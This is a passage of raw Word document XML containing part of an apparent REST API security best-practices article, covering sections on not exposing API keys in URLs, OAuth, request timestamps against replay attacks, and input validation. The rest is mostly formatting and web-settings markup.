          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> algorithms.</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lastRenderedPageBreak/>
        <w:t>2.4. Never expose information on URLs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Usernames, passwords, session tokens, and API keys should not appear in the URL, as this can be captured in web server logs, which makes them easily exploitable.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="ABB2BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>https://api.domain.com/user-management/users/{id}/someAction?apiKey=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="ABB2BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>abcd123456789  /</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="ABB2BF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>/Very BAD !!</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The above URL exposes the API key. So, never use this form of security.</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2.5. Consider OAuth</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Though </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t xml:space="preserve">basic </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>auth</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> is good enough for most of the APIs and if implemented correctly, it’s secure as well – yet you may want to consider </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>OAuth</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> as well.</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2.6. Consider Adding Timestamp in Request</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Along with other request parameters, you may add a request timestamp as an HTTP custom header in API requests.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The server will compare the current timestamp to the request timestamp and only accepts the request if it is after a reasonable timeframe (30 seconds, perhaps).</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This will prevent very basic </w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>replay attacks</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> from people who are trying to </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>brute force</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> your system without changing this timestamp.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="0" w:after="300" w:line="408" w:lineRule="atLeast"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
        </w:rPr>
        <w:t>2.7. Input Parameter Validation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="360" w:afterAutospacing="0"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Validate request parameters on the very first step, before it reaches application logic. Put strong validation checks and reject the request immediately if validation fails.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>In API response, send relevant error messages and examples of correct input format to improve user experience.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="0080304A" w:rsidRPr="0079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2068"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CDE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4186"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D77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07A7D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AC6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D546D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25E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D7E3C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="141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E2306"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BE0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30D4F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F6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32B56"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8B7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11CD4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6CF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37C28"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="999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37576"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F27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312E7D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="378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E5DB5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="553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046367"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="52E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726F44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A3C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F51F9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F1E81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A1492"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="987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3706AD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7E808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7C598B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F7EE2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A0408"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A2345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6C4F36"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="149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C6803"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25360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14"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="10"/>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4A"/>
    <w:rsid w:val="00094B5B"/>
    <w:rsid w:val="00271AF4"/>
    <w:rsid w:val="007142E6"/>
    <w:rsid w:val="00790A44"/>
    <w:rsid w:val="0080304A"/>
    <w:rsid w:val="008423E3"/>
    <w:rsid w:val="00891284"/>
    <w:rsid w:val="008E1AF9"/>
    <w:rsid w:val="00933883"/>
    <w:rsid w:val="00AD3BE1"/>
    <w:rsid w:val="00C44B55"/>
    <w:rsid w:val="00CE2D05"/>
    <w:rsid w:val="00D252F5"/>
    <w:rsid w:val="00D8031F"/>
    <w:rsid w:val="00DF5E36"/>
    <w:rsid w:val="00E92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C660"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{B876E7CC-6811-4E16-AF41-BEEE6933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3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0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30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04A"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="0080304A"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="008030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04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030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04A"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="wpd-sbs-title">
    <w:name w:val="wpd-sbs-title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008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4009">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="72818737">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="358242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007281">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="578907478">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="3385781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3384635">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="126314738">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="924848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3744102">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="682974630">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1116289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9709370">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1798255046">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="4347881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3679255">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1932158390">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="6299397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9540408">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="316961714">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1524510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552739">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="475296842">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="593248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2624620">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="376777173">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1610160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17728682">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="696346164">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="8291757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7152559">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="282274085">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="230695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6563466">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="275021472">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="522671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7286231">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1554387535">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1003165033">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="1440"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1987588985">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="750"/>
              <w:marBottom w:val="750"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1687169163">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="105"/>
                  <w:marBottom w:val="225"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="373964213">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1439135519">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="300"/>
                          <w:marBottom w:val="75"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="single" w:sz="6" w:space="7" w:color="CCCCCC"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
